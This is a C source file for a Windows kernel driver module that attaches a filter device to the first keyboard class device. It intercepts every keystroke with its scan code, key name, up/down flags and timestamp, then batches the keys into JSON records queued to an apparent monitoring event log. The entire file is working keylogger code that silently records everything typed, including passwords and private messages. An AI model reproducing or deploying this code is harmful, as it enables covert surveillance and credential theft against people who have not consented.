#include <inc/keybrd.h>
#include <inc/klogger.h>
#include <inc/monitor.h>
#include <inc/json.h>
#include <inc/time.h>

#include <Ntstrsafe.h>
#include <ntddkbd.h>
#define __SUBCOMPONENT__ "keybrd"
#define MODULE_TAG 'kbdm'
#define KBD_BUFF_TAG 'kbds'
#define FMT_BUFF_TAG 'kbdp'

PCHAR g_ScanCodeMap[] =  {"UNK", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", 
                        "9", "0", "-", "=", "BS", "TAB", "Q", "W", "E", "R", 
                        "T", "Y", "U", "I", "O", "P", "[", "]", "ENTER", "CTRL", 
                        "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", 
                        "'", "`", "LSHIFT", "\\", "Z", "X", "C", "V", "B", "N", 
                        "M", ",", ".", "/", "RSHIFT", "PRTSCR", "ALT", "SPACE", "CAPS", "F1",
                        "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM",
                        "SCROLL", "HOME", "UP", "PGUP", "NUM-", "LEFT", "CENTER", "RIGHT", "NUM+", "END",
                        "DOWN", "PGDN", "INS", "DEL"};

STRING g_ScanCodeMapS[RTL_NUMBER_OF(g_ScanCodeMap)];

VOID
    MapScanCodeInit()
{
    ULONG i;
    for (i = 0; i < RTL_NUMBER_OF(g_ScanCodeMap); i++) {
        RtlInitString(&g_ScanCodeMapS[i], g_ScanCodeMap[i]);
    }
}

PSTRING
    MapScanCode(USHORT ScanCode)
{
    if (ScanCode < RTL_NUMBER_OF(g_ScanCodeMapS)) {
        return &g_ScanCodeMapS[ScanCode];
    } else {
        return &g_ScanCodeMapS[0];
    }
}


VOID KbdDeref(PKBD_CONTEXT Kbd)
{
    if (0 == InterlockedDecrement(&Kbd->RefCount)) {
        KeSetEvent(&Kbd->ShutdownEvent, 2, FALSE);
    }
}

BOOLEAN KbdRef(PKBD_CONTEXT Kbd)
{
    if (Kbd->Shutdown)
        return FALSE;

    InterlockedIncrement(&Kbd->RefCount);
    if (Kbd->Shutdown) {
        KbdDeref(Kbd);
        return FALSE;
    }

    return TRUE;
}

NTSTATUS
	KbdKeyToJson(
		PKBD_KEY Key,
		char **pJson
	)
{
	JSON_MAP map;
	NTSTATUS Status;
	char *sysTime = NULL;
	LONG Key_Up = 0;
	LONG Key_E0 = 0;
	LONG Key_E1 = 0;
	char *json = NULL;

	if (JsonMapInit(&map))
		return STATUS_NO_MEMORY;

	sysTime = TimepQuerySystemTime(&Key->TimeFields);
	if (sysTime == NULL) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	if (JsonMapSetString(&map, "buffer", Key->Str->Buffer)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}
	
	if (JsonMapSetLong(&map, "makeCode", Key->MakeCode)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	if (JsonMapSetLong(&map, "flags", Key->Flags)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	if (JsonMapSetString(&map, "sysTime", sysTime)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}
	
	if (Key->Flags & KEY_BREAK)
		Key_Up = 1;

	if (Key->Flags & KEY_E0)
		Key_E0 = 1;

	if (Key->Flags & KEY_E1)
		Key_E1 = 1;


	if (JsonMapSetLong(&map, "keyUp", Key_Up)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	if (JsonMapSetLong(&map, "keyE0", Key_E0)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	if (JsonMapSetLong(&map, "keyE1", Key_E1)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	json = JsonMapDumps(&map);
	if (json == NULL) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}
	
	*pJson = json;
	Status = STATUS_SUCCESS;

cleanup:
	JsonMapRelease(&map);

	if (sysTime != NULL)
		ExFreePool(sysTime);

	return Status;
}

#define KEY_ID_S_CHARS 0x10

NTSTATUS
	KbdBufKeysToJson(PKBD_CONTEXT Kbd, PKBD_KEY Keys, ULONG KeysCount, char **ppJson)
{
	JSON_MAP map;
	BOOLEAN mapInited = FALSE;
	ULONG Index = 0;
	NTSTATUS Status;
	char *keyJson = NULL, *keyIdEnd = NULL;
	char keyId[KEY_ID_S_CHARS];
	size_t remains = KEY_ID_S_CHARS;
	char *pJson = NULL;

	if (!KbdRef(Kbd)) {
		return STATUS_TOO_LATE;
	}

	if (JsonMapInit(&map)) {
		Status = STATUS_NO_MEMORY;
		goto cleanup;
	}

	mapInited = TRUE;

	for (Index = 0; Index < KeysCount; Index++) {
		remains = KEY_ID_S_CHARS;
		Status = RtlStringCchPrintfExA(keyId, remains, &keyIdEnd, &remains, 0, "%u", Index);
		if (!NT_SUCCESS(Status)) {
			KLog(LError, "RtlStringCchPrintfExA failed with err=%x", Status);
			continue;
		}

		keyId[KEY_ID_S_CHARS - 1] = '\0';
		Status = KbdKeyToJson(&Keys[Index], &keyJson);
		if (NT_SUCCESS(Status)) {
			if (JsonMapSetString(&map, keyId, keyJson)) {
				KLog(LError, "JsonMapSetString failed for key=%s, value=%s", keyId, keyJson);
			}
			ExFreePool(keyJson);
		} else {
			KLog(LError, "KbdKeyToJson failed with err=%x", Status);
		}
	}

	pJson = JsonMapDumps(&map);
	if (pJson != NULL) {
		*ppJson = pJson;
		Status = STATUS_SUCCESS;
	} else {
		KLog(LError, "JsonMapDumps failed");
		Status = STATUS_NO_MEMORY;
	}

cleanup:
	if (mapInited)
		JsonMapRelease(&map);

	KbdDeref(Kbd);
	return Status;
}


PKBD_BUF KbdAllocBuffer(PKBD_CONTEXT Kbd)
{
    KIRQL Irql;
    PLIST_ENTRY ListEntry;
    PKBD_BUF Buff = NULL;

    KeAcquireSpinLock(&Kbd->Lock, &Irql);
    if (!IsListEmpty(&Kbd->FreeList)) {
        ListEntry = RemoveHeadList(&Kbd->FreeList);
        Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
        Buff->Length = 0;
    }
    KeReleaseSpinLock(&Kbd->Lock, Irql);
    return Buff;
}

VOID KbdFreeBuffer(PKBD_CONTEXT Kbd, PKBD_BUF Buff, BOOLEAN bLock)
{
    KIRQL Irql;
	if (bLock)
	    KeAcquireSpinLock(&Kbd->Lock, &Irql);
    
	InsertHeadList(&Kbd->FreeList, &Buff->ListEntry);
	
	if (bLock)
		KeReleaseSpinLock(&Kbd->Lock, Irql);
}


VOID KbdThreadStop(PKBD_CONTEXT Kbd)
{
    Kbd->ThreadStop = TRUE;
    KeSetEvent(&Kbd->FlushEvent, 2, FALSE);

    if (Kbd->ThreadHandle != NULL) {
        ZwWaitForSingleObject(Kbd->ThreadHandle, FALSE, NULL);
        ZwClose(Kbd->ThreadHandle);
        Kbd->ThreadHandle = NULL;
    }

    if (Kbd->Thread != NULL) {
        KeWaitForSingleObject(Kbd->Thread, Executive, KernelMode, FALSE, NULL);
        ObDereferenceObject(Kbd->Thread);
        Kbd->Thread = NULL;
    }
}

#define KBD_KEYS_PER_REQUEST 20

VOID KbdThreadRoutine(PVOID Context)
{
    PKBD_CONTEXT Kbd = (PKBD_CONTEXT)Context;
    NTSTATUS Status;
    KIRQL Irql;
    PKBD_BUF Buff;
    PLIST_ENTRY ListEntry;
	char *BufJson = NULL;
	PKBD_KEY Keys = NULL;
	ULONG KeysOffset = 0;
	BOOLEAN bFlushKeys = FALSE;

    KLog(LInfo, "Kbd thread started %p\n", PsGetCurrentThread());
	Keys = (PKBD_KEY)ExAllocatePoolWithTag(NonPagedPool, KBD_KEYS_PER_REQUEST*sizeof(KBD_KEY), MODULE_TAG);
	if (Keys == NULL) {
		KLog(LError, "alloc keys failed");
		goto cleanup;
	}

    while (TRUE) {
        Status = KeWaitForSingleObject(&Kbd->FlushEvent, Executive, KernelMode, FALSE, NULL);
        if (!NT_SUCCESS(Status)) {
            KLog(LError, "KeWaitForSingleObject failed with err %x\n", Status);
        }

        KeAcquireSpinLock(&Kbd->Lock, &Irql);
        while (!IsListEmpty(&Kbd->FlushQueue)) {
            ListEntry = Kbd->FlushQueue.Flink;
			Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
			if (Buff->Length > (KBD_KEYS_PER_REQUEST - KeysOffset)) {
				bFlushKeys = TRUE;
			} else {
				RtlCopyMemory(Keys + KeysOffset, Buff->Keys, Buff->Length*sizeof(KBD_KEY));
				KeysOffset += Buff->Length;
				
				if (KeysOffset == KBD_KEYS_PER_REQUEST)
					bFlushKeys = TRUE;

				RemoveEntryList(&Buff->ListEntry);
				KbdFreeBuffer(Kbd, Buff, FALSE);
			}
			if (bFlushKeys)
				break;
        }
        KeReleaseSpinLock(&Kbd->Lock, Irql);
		
		if (bFlushKeys) {
			Status = KbdBufKeysToJson(Kbd, Keys, KeysOffset, &BufJson);
			KeysOffset = 0;
			bFlushKeys = FALSE;
			if (!NT_SUCCESS(Status)) {
				KLog(LError, "KbdBufKeysToJson failed err=%x", Status);
				goto next_step;
			}

			PSREQUEST request = SRequestCreate(SREQ_TYPE_KEYBRD);
			if (request == NULL) {
				KLog(LError, "SRequestCreate failed");
				ExFreePool(BufJson);
				goto next_step;
			}
			
			//KLog(LInfo, "BufJson=%s", BufJson);

			request->data = BufJson;
			request->dataSz = strlen(BufJson);
			Status = EventLogAdd(&MonitorGetInstance()->EventLog, request);
			if (!NT_SUCCESS(Status)) {
				KLog(LError, "EventLogAdd failed err=%x", Status);
				SRequestDelete(request);
				goto next_step;
			}
		}

next_step:
        if (Kbd->ThreadStop)
            break;
    }
cleanup:
	if (Keys != NULL)
		ExFreePoolWithTag(Keys, MODULE_TAG);

    KLog(LInfo, "Kbd thread stopped %p\n", PsGetCurrentThread());
}

NTSTATUS KbdThreadStart(PKBD_CONTEXT Kbd)
{
    NTSTATUS Status;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(
        &ObjectAttributes, NULL,
        OBJ_KERNEL_HANDLE,
        NULL,NULL
        );

    Status = PsCreateSystemThread(	&Kbd->ThreadHandle,
                                    THREAD_ALL_ACCESS,
                                    &ObjectAttributes,
                                    0L,
                                    NULL,
                                    KbdThreadRoutine,
                                    Kbd
                                    );

    if (!NT_SUCCESS(Status)) {
        KLog(LError, "PsCreateSystemThread failed with err %x\n", Status);
        return Status;
    }

    Status = ObReferenceObjectByHandle(	Kbd->ThreadHandle,
                                        THREAD_ALL_ACCESS,
                                        *PsThreadType,
                                        KernelMode,
                                        &Kbd->Thread,
                                        NULL
                                        );
    if (!NT_SUCCESS(Status)) {
        KLog(LError, "ObReferenceObjectByHandle failed with err %x\n", Status);
        KbdThreadStop(Kbd);
        return Status;
    }

    ZwClose(Kbd->ThreadHandle);
    Kbd->ThreadHandle = NULL;

    return STATUS_SUCCESS;
}


NTSTATUS 
    KbdAttach(PKBD_CONTEXT Kbd)
{
    CCHAR                   ntNameBuffer[64];
    STRING                  ntNameString;
    UNICODE_STRING          ntUnicodeString;
    NTSTATUS                Status;
    //
    // Only hook onto the first keyboard's chain.
    //
    RtlStringCbPrintfA(ntNameBuffer, 64, "\\Device\\KeyboardClass0" );
    RtlInitAnsiString( &ntNameString, ntNameBuffer );
    RtlAnsiStringToUnicodeString( &ntUnicodeString, &ntNameString, TRUE );
    //
    // Create device object for the keyboard.
    //
    Status = IoCreateDevice( Kbd->DriverObject,
                       0,
                       NULL,
                       FILE_DEVICE_KEYBOARD,
                       0,
                       FALSE,
                       &Kbd->HookDeviceObject );
    if( !NT_SUCCESS(Status) ) {
        KLog(LError, "failed to create hook device object! %x", Status);
        RtlFreeUnicodeString( &ntUnicodeString );
        return Status;
    }
    //
    // Keyboard uses buffered I/O so we must as well.
    //

    Kbd->HookDeviceObject->Flags |= DO_BUFFERED_IO;

    //
    // Attach to the keyboard chain.
    //

    Status = IoAttachDevice( Kbd->HookDeviceObject, &ntUnicodeString, &Kbd->KbdDeviceObject);
    if ( !NT_SUCCESS(Status) ) {
        KLog(LError, "IoAttachDevice with keyboard failed! %x", Status);
        IoDeleteDevice( Kbd->HookDeviceObject );
        Kbd->HookDeviceObject = NULL;
        RtlFreeUnicodeString( &ntUnicodeString );
        return Status;
    }
    //
    // Done! Just free our string and be on our way...
    //

    RtlFreeUnicodeString( &ntUnicodeString );

    KLog(LInfo, "Successfully connected to keyboard device");
    //
    // This line simply demonstrates how a driver can print
    // stuff to the bluescreen during system initialization.
    //

    return STATUS_SUCCESS;
}

NTSTATUS 
    KbdReadComplete( 
        IN PDEVICE_OBJECT DeviceObject, 
        IN PIRP Irp,
        IN PVOID Context
        )
{
    PIO_STACK_LOCATION        IrpSp;
    PKEYBOARD_INPUT_DATA      KeyData;
    ULONG                      numKeys, i;
    PKBD_CONTEXT Kbd = (PKBD_CONTEXT)Context;
    KIRQL Irql;

    //
    // Request completed - look at the result.
    //

    //KLog(LInfo, "read complete %x", Irp->IoStatus.Status);

    IrpSp = IoGetCurrentIrpStackLocation( Irp );
    if( NT_SUCCESS( Irp->IoStatus.Status ) ) {

        //
        // Do caps-lock down and caps-lock up. Note that
        // just frobbing the MakeCode handles both the up-key
        // and down-key cases since the up/down information is specified
        // seperately in the Flags field of the keyboard input data 
        // (0 means key-down, 1 means key-up).
        //

        KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        numKeys = (ULONG)Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

        i = 0;
        while (i < numKeys) {
            PKBD_BUF Buf = NULL;
            ULONG j;
            
            Buf = KbdAllocBuffer(Kbd);
            if (Buf == NULL) {
                __debugbreak();
            }

            for (j = 0; j < KBD_BUF_SZ; j++) {
                Buf->Keys[j].MakeCode = KeyData[i].MakeCode;
                Buf->Keys[j].Str = MapScanCode(KeyData[i].MakeCode);
                Buf->Keys[j].Flags = KeyData[i].Flags;
                GetLocalTimeFields(&Buf->Keys[j].TimeFields);
                Buf->Length++;
                //KLog(LInfo, "ScanCode: %x %s key %s", KeyData[i].MakeCode , KeyData[i].Flags ? "Up" : "Down", MapScanCode(KeyData[i].MakeCode));
                i++;
                if (i == numKeys)
                    break;
            }           
            KeAcquireSpinLock(&Kbd->Lock, &Irql);
            InsertTailList(&Kbd->FlushQueue, &Buf->ListEntry);
            KeReleaseSpinLock(&Kbd->Lock, Irql);
            KeSetEvent(&Kbd->FlushEvent, 2, FALSE);
        }
    }

    if ( Irp->PendingReturned ) {
        IoMarkIrpPending( Irp );
    }

    KbdDeref(Kbd);
    return STATUS_SUCCESS;
}

NTSTATUS 
    KbdNotReadComplete( 
        IN PDEVICE_OBJECT DeviceObject, 
        IN PIRP Irp,
        IN PVOID Context
        )
{
    PKBD_CONTEXT Kbd = (PKBD_CONTEXT)Context;
    if ( Irp->PendingReturned ) {
        IoMarkIrpPending( Irp );
    }

    KbdDeref(Kbd);
    return STATUS_SUCCESS;
}

NTSTATUS 
    KbdDispatchGeneral(
		IN PKBD_CONTEXT		Kbd,
        IN PDEVICE_OBJECT   DeviceObject,
        IN PIRP             Irp,
        IN BOOLEAN          *pbHandled
        )
{
    PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(Irp);
    PIO_STACK_LOCATION nextIrpStack    = IoGetNextIrpStackLocation(Irp);

    *pbHandled = FALSE;
//    KLog(LInfo, "DevObj %p Major %x Minor %x", DeviceObject, currentIrpStack->MajorFunction, currentIrpStack->MinorFunction);

    //
    // If this call was directed at the hook device, pass it to 
    // the keyboard class device, else handle it ourselves.
    // 

    if (!KbdRef(Kbd))
        return STATUS_SUCCESS;

    if ((DeviceObject == Kbd->HookDeviceObject) && (Kbd->KbdDeviceObject != NULL)) {
        *nextIrpStack = *currentIrpStack;

        if (currentIrpStack->MajorFunction == IRP_MJ_READ) {
                //KLog(LInfo, "set comp routine for irp %p", Irp);
            IoSetCompletionRoutine( Irp, KbdReadComplete, Kbd, TRUE, TRUE, TRUE );
        } else {
			IoSetCompletionRoutine(Irp, KbdNotReadComplete, Kbd, TRUE, TRUE, TRUE);
        }

        *pbHandled = TRUE;
		return IoCallDriver(Kbd->KbdDeviceObject, Irp);
    } else {
		KbdDeref(Kbd);
        return STATUS_SUCCESS;
    }
}

VOID
	KbdInit(PKBD_CONTEXT Kbd)
{
	KIRQL Irql;
	ULONG Index;

	MapScanCodeInit();

	RtlZeroMemory(Kbd, sizeof(KBD_CONTEXT));
	Kbd->DriverObject = MonitorGetInstance()->DriverObject;

	InitializeListHead(&Kbd->FreeList);
	InitializeListHead(&Kbd->FlushQueue);

	KeInitializeSpinLock(&Kbd->Lock);
	KeInitializeEvent(&Kbd->FlushEvent, SynchronizationEvent, FALSE);

	KeAcquireSpinLock(&Kbd->Lock, &Irql);
	for (Index = 0; Index < KBD_BUF_COUNT; Index++)
		InsertHeadList(&Kbd->FreeList, &Kbd->Buffs[Index].ListEntry);
	KeReleaseSpinLock(&Kbd->Lock, Irql);

	KeInitializeEvent(&Kbd->ShutdownEvent, NotificationEvent, FALSE);

}

NTSTATUS
	KbdStart(PKBD_CONTEXT Kbd)
{
	NTSTATUS    Status;
	KLog(LInfo, "started");

	KbdRef(Kbd);
	Status = KbdThreadStart(Kbd);
	if (!NT_SUCCESS(Status)) {
		goto start_failed;
	}

	Status = KbdAttach(Kbd);
	if (!NT_SUCCESS(Status)) {
		goto start_failed;
	}

	Kbd->Shutdown = 0;

	return STATUS_SUCCESS;

start_failed:
	KLog(LInfo, "completed");
	KbdStop(Kbd);
	return Status;
}

VOID
	KbdStop(PKBD_CONTEXT Kbd)
{
	PLIST_ENTRY ListEntry;
	KIRQL Irql;
	PKBD_BUF_JSON Entry;
	ULONG Index;

	KLog(LInfo, "started");
	InterlockedIncrement(&Kbd->Shutdown);
	KbdDeref(Kbd);
	KeWaitForSingleObject(&Kbd->ShutdownEvent, Executive, KernelMode, FALSE, NULL);

	if (Kbd->KbdDeviceObject != NULL) {
		PDEVICE_OBJECT DeviceObject = Kbd->KbdDeviceObject;
		Kbd->KbdDeviceObject = NULL;
		IoDetachDevice(DeviceObject);
	}

	KbdThreadStop(Kbd);
	if (Kbd->HookDeviceObject != NULL) {
		PDEVICE_OBJECT DeviceObject = Kbd->HookDeviceObject;
		Kbd->HookDeviceObject = NULL;
		IoDeleteDevice(DeviceObject);
	}
	KLog(LInfo, "completed");

	KeResetEvent(&Kbd->ShutdownEvent);
	KeResetEvent(&Kbd->FlushEvent);

	InitializeListHead(&Kbd->FreeList);
	InitializeListHead(&Kbd->FlushQueue);

	KeAcquireSpinLock(&Kbd->Lock, &Irql);
	for (Index = 0; Index < KBD_BUF_COUNT; Index++)
		InsertHeadList(&Kbd->FreeList, &Kbd->Buffs[Index].ListEntry);
	KeReleaseSpinLock(&Kbd->Lock, Irql);

	Kbd->RefCount = 0;
	KLog(LInfo, "reinited");
}